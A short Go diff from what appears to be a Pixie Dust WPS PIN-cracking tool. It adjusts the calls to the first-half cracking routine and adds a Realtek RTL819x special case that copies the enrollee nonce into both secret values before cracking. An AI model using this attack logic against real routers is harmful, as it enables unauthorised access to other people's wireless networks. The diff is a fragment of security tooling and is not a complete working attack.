@@ -42,7 +42,7 @@ func (pda *pixieDustAttack) executeRTL819xCase() {
 	if pda.hasAllRTLdata() {
 		pda.emptyPinHMAC()
 		pda.findESecrets()
-		pda.crackFirstHalf([]byte{})
+		pda.crackFirstHalf(nil)
 		pda.crackSecondHalf()
 	}
 
@@ -218,7 +218,10 @@ func (pda *pixieDustAttack) displaySSIDFromM7() {
 
 
 func (pda *pixieDustAttack) rtl819xSpecialCase() {
-    pda.crackFirstHalf([]byte{})
+	copy(pda.eSecret1, pda.eNonce)
+	copy(pda.eSecret2, pda.eNonce)
+
+    pda.crackFirstHalf(nil)
     pda.crackSecondHalf()
 
     if !pda.pinFound() {
